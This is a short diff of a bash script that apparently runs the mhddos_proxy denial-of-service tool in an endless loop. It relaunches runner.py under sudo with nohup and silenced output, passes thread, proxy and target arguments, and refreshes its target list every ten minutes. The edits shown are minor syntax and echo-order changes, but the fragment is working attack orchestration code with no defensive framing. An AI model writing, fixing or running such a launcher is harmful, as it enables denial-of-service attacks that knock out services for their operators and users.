@@ -28,7 +28,7 @@ sudo pkill -f runner.py
 
 
 # Restart attacks and update targets list every 10 minutes (by default)
-while [ 1 == 1 ]
+while [[ 1 == 1 ]]
 #echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
@@ -47,7 +47,7 @@ do
            
 
             echo "full cmd:"
-            echo "$cmd_line $proxy_interval $threads $rpc"
+            echo "$proxy_interval $threads $rpc $cmd_line"
             
             cd ~/mhddos_proxy
             nohup sudo python3 runner.py $threads $proxy_interval $rpc $cmd_line --debug </dev/null &>/dev/null &
